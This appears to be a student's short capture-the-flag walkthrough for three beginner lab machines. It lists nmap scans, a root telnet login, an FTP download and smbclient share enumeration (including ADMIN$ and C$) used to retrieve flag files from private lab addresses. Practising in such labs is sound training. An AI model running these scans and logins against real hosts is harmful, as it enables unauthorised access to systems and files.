Maullido
ping 10.129.175.101
nmap -sC 10.129.175.101
telnet -l root 10.129.175.101
ls
cat flag.txt

Adular
nmap -sC 10.129.173.229
ftp -?
ftp 10.129.73.229
get flag.txt
exit o bye
cat flag.txt

Baile
nmap -sV
sudo apt-get install smbclient
smbclient -L 10.129.246.26
smbclient \\\\10.129.246.26\\ADMIN$
smbclient \\\\10.129.246.26\\C$
smbclient \\\\10.129.246.26\\WorkShares
ls
cd Amy.j
ls
get worknotes.txt
cd ..
cd James.P
ls
get flag.txt
exit
cat worknotes.txt
cat flag.txt